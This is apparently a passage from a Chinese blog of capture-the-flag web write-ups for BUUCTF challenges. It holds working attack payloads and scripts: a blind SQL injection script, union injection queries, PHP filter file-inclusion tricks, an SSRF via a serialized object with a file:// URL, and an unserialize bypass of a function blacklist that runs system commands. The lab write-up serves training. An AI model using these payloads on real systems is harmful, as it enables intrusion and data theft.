href=https://blog.w8nn9z.top/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">BUUCTF WEB page2</h1><div class=post-meta><span title='2025-07-22 00:00:00 +0000 UTC'>July 22, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#ciscn2019-%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba-day2-web1hack-world aria-label="[CISCN2019 华北赛区 Day2 Web1]Hack World">[CISCN2019 华北赛区 Day2 Web1]Hack World</a></li><li><a href=#bsidescf-2020had-a-bad-day aria-label="[BSidesCF 2020]Had a bad day">[BSidesCF 2020]Had a bad day</a></li><li><a href=#%e7%bd%91%e9%bc%8e%e6%9d%af-2018fakebook aria-label="[网鼎杯 2018]Fakebook">[网鼎杯 2018]Fakebook</a></li><li><a href=#%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e6%9c%b1%e9%9b%80%e7%bb%84phpweb aria-label="[网鼎杯 2020 朱雀组]phpweb">[网鼎杯 2020 朱雀组]phpweb</a></li><li><a href=#bjdctf2020the-mystery-of-ip aria-label="[BJDCTF2020]The mystery of ip">[BJDCTF2020]The mystery of ip</a></li><li><a href=#bjdctf2020zjctf%e4%b8%8d%e8%bf%87%e5%a6%82%e6%ad%a4 aria-label=[BJDCTF2020]ZJCTF，不过如此>[BJDCTF2020]ZJCTF，不过如此</a></li><li><a href=#buuctf-2018online-tool aria-label="[BUUCTF 2018]Online Tool">[BUUCTF 2018]Online Tool</a></li><li><a href=#gxyctf2019%e7%a6%81%e6%ad%a2%e5%a5%97%e5%a8%83 aria-label=[GXYCTF2019]禁止套娃>[GXYCTF2019]禁止套娃</a></li><li><a href=#nctf2019fake-xml-cookbook aria-label="[NCTF2019]Fake XML cookbook">[NCTF2019]Fake XML cookbook</a></li><li><a href=#gwctf-2019%e6%88%91%e6%9c%89%e4%b8%80%e4%b8%aa%e6%95%b0%e6%8d%ae%e5%ba%93 aria-label="[GWCTF 2019]我有一个数据库">[GWCTF 2019]我有一个数据库</a></li><li><a href=#bjdctf2020mark-loves-cat aria-label="[BJDCTF2020]Mark loves cat">[BJDCTF2020]Mark loves cat</a></li><li><a href=#wustctf2020%e6%9c%b4%e5%ae%9e%e6%97%a0%e5%8d%8e aria-label=[WUSTCTF2020]朴实无华>[WUSTCTF2020]朴实无华</a></li><li><a href=#bjdctf2020cookie-is-so-stable aria-label="[BJDCTF2020]Cookie is so stable">[BJDCTF2020]Cookie is so stable</a></li><li><a href=#mrctf2020ezpop aria-label=[MRCTF2020]Ezpop>[MRCTF2020]Ezpop</a></li><li><a href=#mrctf2020pywebsite aria-label=[MRCTF2020]PYWebsite>[MRCTF2020]PYWebsite</a></li><li><a href=#%e5%ae%89%e6%b4%b5%e6%9d%af-2019easy_web aria-label="[安洵杯 2019]easy_web">[安洵杯 2019]easy_web</a></li><li><a href=#westernctf2018shrine aria-label=[WesternCTF2018]shrine>[WesternCTF2018]shrine</a></li><li><a href=#%e5%ae%89%e6%b4%b5%e6%9d%af-2019easy_serialize_php aria-label="[安洵杯 2019]easy_serialize_php">[安洵杯 2019]easy_serialize_php</a></li><li><a href=#%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e6%9c%b1%e9%9b%80%e7%bb%84nmap aria-label="[网鼎杯 2020 朱雀组]Nmap">[网鼎杯 2020 朱雀组]Nmap</a></li><li><a href=#npuctf2020readlezphp aria-label=[NPUCTF2020]ReadlezPHP>[NPUCTF2020]ReadlezPHP</a></li><li><a href=#asis-2019unicorn-shop aria-label="[ASIS 2019]Unicorn shop">[ASIS 2019]Unicorn shop</a></li><li><a href=#ciscn2019-%e5%8d%8e%e4%b8%9c%e5%8d%97%e8%b5%9b%e5%8c%baweb11 aria-label="[CISCN2019 华东南赛区]Web11">[CISCN2019 华东南赛区]Web11</a></li><li><a href=#bsidescf-2019kookie aria-label="[BSidesCF 2019]Kookie">[BSidesCF 2019]Kookie</a></li><li><a href=#swpu2019web1 aria-label=[SWPU2019]Web1>[SWPU2019]Web1</a></li><li><a href=#bsidescf-2019futurella aria-label="[BSidesCF 2019]Futurella">[BSidesCF 2019]Futurella</a></li><li><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019finalsql aria-label="[极客大挑战 2019]FinalSQL">[极客大挑战 2019]FinalSQL</a></li><li><a href=#ciscn-2019-%e5%88%9d%e8%b5%9blove-math aria-label="[CISCN 2019 初赛]Love Math">[CISCN 2019 初赛]Love Math</a></li><li><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019rce-me aria-label="[极客大挑战 2019]RCE ME">[极客大挑战 2019]RCE ME</a></li><li><a href=#de1ctf-2019ssrf-me aria-label="[De1CTF 2019]SSRF Me">[De1CTF 2019]SSRF Me</a></li><li><a href=#bjdctf2020easysearch aria-label=[BJDCTF2020]EasySearch>[BJDCTF2020]EasySearch</a></li><li><a href=#wustctf2020%e9%a2%9c%e5%80%bc%e6%88%90%e7%bb%a9%e6%9f%a5%e8%af%a2 aria-label=[WUSTCTF2020]颜值成绩查询>[WUSTCTF2020]颜值成绩查询</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=ciscn2019-华北赛区-day2-web1hack-world>[CISCN2019 华北赛区 Day2 Web1]Hack World<a hidden class=anchor aria-hidden=true href=#ciscn2019-华北赛区-day2-web1hack-world>#</a></h2><p>fuzz发现空格，-等都被过滤，考虑布尔盲注，if判断为真返回1，查询id为1的数据：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://b9309530-9abc-44a2-ace2-f39ae7be8858.node5.buuoj.cn:81/index.php&#34;</span>
</span></span><span style=display:flex><span>chars <span style=color:#f92672>=</span> <span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;-</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>ascii_lowercase <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>40</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> chars:
</span></span><span style=display:flex><span>        asciiValue <span style=color:#f92672>=</span> ord(c)
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;if(ascii(substr((select(flag)from(flag)),</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>,1))=</span><span style=color:#e6db74>{</span>asciiValue<span style=color:#e6db74>}</span><span style=color:#e6db74>,1,0)&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;id&#34;</span>:payload}
</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url,data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;girlfriend&#34;</span> <span style=color:#f92672>in</span> resp<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>            flag <span style=color:#f92672>+=</span> c
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;flag ==&gt; </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><p>flag{c1866cef-500f-403b-aec7-6d4d0898d8f3}</p><hr><h2 id=bsidescf-2020had-a-bad-day>[BSidesCF 2020]Had a bad day<a hidden class=anchor aria-hidden=true href=#bsidescf-2020had-a-bad-day>#</a></h2><p>传参?category=meowers123会报错：</p><pre tabindex=0><code>Warning: include(meowers123.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37

Warning: include(): Failed opening &#39;meowers123.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in /var/www/html/index.php on line 37
</code></pre><p>传参?category=meo123wers无报错，但回显如下：</p><pre tabindex=0><code>Sorry, we currently only support woofers and meowers. 
</code></pre><p>猜测category中必须包含字符串woofers或meowers，先用伪协议+include规范化路径的特性获取index.php：</p><pre tabindex=0><code>?category=php://filter/read=convert.base64-encode/resource=meowers123.php/../index
</code></pre><p>只看被解析的php代码部分：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>				$file <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;category&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($file))
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>strpos</span>( $file, <span style=color:#e6db74>&#34;woofers&#34;</span> ) <span style=color:#f92672>!==</span>  <span style=color:#66d9ef>false</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>strpos</span>( $file, <span style=color:#e6db74>&#34;meowers&#34;</span> ) <span style=color:#f92672>!==</span>  <span style=color:#66d9ef>false</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>strpos</span>( $file, <span style=color:#e6db74>&#34;index&#34;</span>)){
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>include</span> ($file <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;.php&#39;</span>);
</span></span><span style=display:flex><span>					}
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Sorry, we currently only support woofers and meowers.&#34;</span>;
</span></span><span style=display:flex><span>					}
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>没写flag在哪，猜测当前目录下存在flag.php</p><pre tabindex=0><code>?category=php://filter/read=convert.base64-encode/resource=meowers123.php/../flag
</code></pre><p>flag.php：</p><pre tabindex=0><code>&lt;!-- Can you read this flag? --&gt;
&lt;?php
 // flag{7fb88bcc-8a31-4dc9-96fc-5bbfdbb2a705}
?&gt;
</code></pre><hr><h2 id=网鼎杯-2018fakebook>[网鼎杯 2018]Fakebook<a hidden class=anchor aria-hidden=true href=#网鼎杯-2018fakebook>#</a></h2><p>这题的环境好像有问题，注册一个账号，无法点击username进行跳转，服务器会崩溃</p><p>不过还好能发现view.php，不带参数访问view.php，报错：</p><pre tabindex=0><code>Notice: Undefined index: no in /var/www/html/view.php on line 24

[*] query error! (You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39; at line 1)

Fatal error: Call to a member function fetch_assoc() on boolean in /var/www/html/db.php on line 66
</code></pre><p>尝试联合注入，过滤了union和select之间的空格，用注释符绕过即可：</p><pre tabindex=0><code>?no=-1 order by 5 --+
[*] query error! (Unknown column &#39;5&#39; in &#39;order clause&#39;)

?no=-1 union/**/select 1,2,3,4 --+
2的位置有回显

?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() --+
users

?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#34;users&#34; --+
no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 

?no=-1 union/**/select 1,passwd,3,4 from `users` --+
3627909a29c31381a071ec27f7c9ca97726182aed29a7ddd2e54353322cfb30abb9e3a6df2ac2c20fe23436311d678564d0c8d305930575f60e2d3d048184d79

?no=-1 union/**/select 1,data,3,4 from `users` --+
O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:7:&#34;test123&#34;;s:3:&#34;age&#34;;i:18;s:4:&#34;blog&#34;;s:15:&#34;www.test114.com&#34;;} 
</code></pre><p>没思路了，看了其他师傅的wp，有robots.txt：</p><pre tabindex=0><code>User-agent: *
Disallow: /user.php.bak
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>UserInfo</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $age <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $blog <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($name, $age, $blog)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> $name;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>age</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>int</span>)$age;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>blog</span> <span style=color:#f92672>=</span> $blog;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get</span>($url)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $ch <span style=color:#f92672>=</span> <span style=color:#a6e22e>curl_init</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>curl_setopt</span>($ch, <span style=color:#a6e22e>CURLOPT_URL</span>, $url);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>curl_setopt</span>($ch, <span style=color:#a6e22e>CURLOPT_RETURNTRANSFER</span>, <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>        $output <span style=color:#f92672>=</span> <span style=color:#a6e22e>curl_exec</span>($ch);
</span></span><span style=display:flex><span>        $httpCode <span style=color:#f92672>=</span> <span style=color:#a6e22e>curl_getinfo</span>($ch, <span style=color:#a6e22e>CURLINFO_HTTP_CODE</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($httpCode <span style=color:#f92672>==</span> <span style=color:#ae81ff>404</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>404</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>curl_close</span>($ch);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $output;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getBlogContents</span> ()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>blog</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>isValidBlog</span> ()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $blog <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>blog</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&#34;</span>, $blog);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>通过目录扫描得知存在flag.php，getBlogContents方法用于获取博客网站内容，将blog设为<code>file:///var/www/html/flag.php</code>即可获得flag.php源码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>UserInfo</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;test&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $age <span style=color:#f92672>=</span> <span style=color:#ae81ff>18</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $blog <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;file:///var/www/html/flag.php&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>print</span>(<span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>UserInfo</span>())));
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><pre tabindex=0><code>O%3A8%3A%22UserInfo%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22age%22%3Bi%3A18%3Bs%3A4%3A%22blog%22%3Bs%3A29%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fflag.php%22%3B%7D
</code></pre><p>结合view.php中总是有unserialize的报错：</p><pre tabindex=0><code>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31
</code></pre><p>猜测是union select 1,2,3,4中某个位置应该是序列化数据，结合2对应username，data又是序列化数据，所以尝试将反序列化内容填入4的位置：</p><pre tabindex=0><code>?no=-1 union/**/select 1,2,3,&#39;O%3A8%3A%22UserInfo%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22age%22%3Bi%3A18%3Bs%3A4%3A%22blog%22%3Bs%3A29%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fflag.php%22%3B%7D&#39; --+
</code></pre><pre tabindex=0><code>&lt;p&gt;the contents of his/her blog&lt;/p&gt;
    &lt;hr&gt;
    &lt;iframe width=&#39;100%&#39; height=&#39;10em&#39; src=&#39;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tkZmY5NmI3Zi1iYzY3LTQ3MTctOTk4Ny02Nzg4MmU0YjE0ZTN9IjsNCmV4aXQoMCk7DQo=&#39;&gt;
</code></pre><p>解码base64得到flag.php源码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;flag{dff96b7f-bc67-4717-9987-67882e4b14e3}&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>exit</span>(<span style=color:#ae81ff>0</span>);
</span></span></code></pre></div><p>还有另一种方法，查看用户权限，发现是root：</p><pre tabindex=0><code>?no=-1 union/**/select 1,user,3,4 from mysql.user --+
</code></pre><p>于是可以用load_file尝试读取文件：</p><pre tabindex=0><code>?no=-1 union/**/select 1,load_file(&#34;/var/www/html/flag.php&#34;),3,4 --+
</code></pre><hr><h2 id=网鼎杯-2020-朱雀组phpweb>[网鼎杯 2020 朱雀组]phpweb<a hidden class=anchor aria-hidden=true href=#网鼎杯-2020-朱雀组phpweb>#</a></h2><p>上来就有报错：</p><pre tabindex=0><code>Warning: date(): It is not safe to rely on the system&#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#39;UTC&#39; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24
2025-07-17 07:02:47 am
</code></pre><p>查看网页源码，发现有两个隐藏的传参func和p，猜测一个是函数名还有一个是参数，尝试先读取index.php的内容：</p><pre tabindex=0><code>?func=file_get_contents&amp;p=index.php
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>    $disable_fun <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;exec&#34;</span>,<span style=color:#e6db74>&#34;shell_exec&#34;</span>,<span style=color:#e6db74>&#34;system&#34;</span>,<span style=color:#e6db74>&#34;passthru&#34;</span>,<span style=color:#e6db74>&#34;proc_open&#34;</span>,<span style=color:#e6db74>&#34;show_source&#34;</span>,<span style=color:#e6db74>&#34;phpinfo&#34;</span>,<span style=color:#e6db74>&#34;popen&#34;</span>,<span style=color:#e6db74>&#34;dl&#34;</span>,<span style=color:#e6db74>&#34;eval&#34;</span>,<span style=color:#e6db74>&#34;proc_terminate&#34;</span>,<span style=color:#e6db74>&#34;touch&#34;</span>,<span style=color:#e6db74>&#34;escapeshellcmd&#34;</span>,<span style=color:#e6db74>&#34;escapeshellarg&#34;</span>,<span style=color:#e6db74>&#34;assert&#34;</span>,<span style=color:#e6db74>&#34;substr_replace&#34;</span>,<span style=color:#e6db74>&#34;call_user_func_array&#34;</span>,<span style=color:#e6db74>&#34;call_user_func&#34;</span>,<span style=color:#e6db74>&#34;array_filter&#34;</span>, <span style=color:#e6db74>&#34;array_walk&#34;</span>,  <span style=color:#e6db74>&#34;array_map&#34;</span>,<span style=color:#e6db74>&#34;registregister_shutdown_function&#34;</span>,<span style=color:#e6db74>&#34;register_tick_function&#34;</span>,<span style=color:#e6db74>&#34;filter_var&#34;</span>, <span style=color:#e6db74>&#34;filter_var_array&#34;</span>, <span style=color:#e6db74>&#34;uasort&#34;</span>, <span style=color:#e6db74>&#34;uksort&#34;</span>, <span style=color:#e6db74>&#34;array_reduce&#34;</span>,<span style=color:#e6db74>&#34;array_walk&#34;</span>, <span style=color:#e6db74>&#34;array_walk_recursive&#34;</span>,<span style=color:#e6db74>&#34;pcntl_exec&#34;</span>,<span style=color:#e6db74>&#34;fopen&#34;</span>,<span style=color:#e6db74>&#34;fwrite&#34;</span>,<span style=color:#e6db74>&#34;file_put_contents&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>gettime</span>($func, $p) {
</span></span><span style=display:flex><span>        $result <span style=color:#f92672>=</span> <span style=color:#a6e22e>call_user_func</span>($func, $p);
</span></span><span style=display:flex><span>        $a<span style=color:#f92672>=</span> <span style=color:#a6e22e>gettype</span>($result);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($a <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;string&#34;</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> $result;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>;}
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> $p <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Y-m-d h:i:s a&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> $func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;date&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>() {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>func</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>gettime</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>func</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    $func <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#34;func&#34;</span>];
</span></span><span style=display:flex><span>    $p <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#34;p&#34;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($func <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>        $func <span style=color:#f92672>=</span> <span style=color:#a6e22e>strtolower</span>($func);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>($func,$disable_fun)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>gettime</span>($func, $p);
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Hacker...&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>...
</span></span></span></code></pre></div><p>反序列化绕过disable_fun对func的限制，不知道为什么无法执行eval，尝试直接执行system(&ldquo;whoami&rdquo;)：</p><pre tabindex=0><code>?func=unserialize&amp;p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A6%3A%22whoami%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D

www-data www-data
